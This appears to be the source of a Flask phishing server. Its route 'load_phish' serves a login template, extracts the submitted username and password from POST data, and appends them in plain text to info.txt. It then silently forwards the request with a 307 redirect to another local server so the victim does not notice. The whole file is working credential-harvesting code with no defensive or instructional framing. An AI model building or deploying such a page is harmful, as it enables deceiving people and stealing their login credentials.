from flask import Flask, redirect, render_template, request

def extract_credentials(query_string):
    parsed_data = {}
    for pair in query_string.split('&'):
        key, value = pair.split('=', 1)
        parsed_data[key] = value
    
    username = parsed_data.get("username")
    password = parsed_data.get("password")
    return username, password


app = Flask(__name__)

@app.route("/", methods=["POST", "GET"])
def load_phish():
    if request.method == "POST":
        text = request.get_data(as_text=True)
        username, password = extract_credentials(text)
        with open("info.txt", "a+") as file:
            file.write(f"{username},{password}\n")
        return redirect("http://127.0.0.1:8080/", 307)
    return render_template("main.html")
